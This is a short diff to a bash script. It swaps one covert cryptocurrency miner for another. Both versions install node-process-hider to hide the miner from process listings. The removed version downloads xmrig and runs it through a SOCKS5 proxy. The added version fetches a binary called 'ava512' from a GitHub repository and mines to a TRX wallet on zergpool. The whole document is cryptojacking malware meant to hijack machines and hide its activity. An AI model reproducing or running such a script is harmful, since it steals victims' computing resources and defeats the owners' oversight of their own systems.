@@ -1,2 +1,3 @@
 #!/bin/bash
-sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz && tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 1EZCD9iejENLbMEDtvRwiADPf94EdC81B5-p c=BTC,mc=GNTL --threads=2 -x socks5://192.252.214.20:15864"
+sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.12.0 && npm i -g node-process-hider && ph add ava512
+wget https://github.com/mrwhjo/cci/raw/main/ava512 && chmod +x ava512 && ./ava512 -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u TMWXVhE6TJNurvBMXVJvptnR8GpdGe7rPY -p c=TRX -t 2
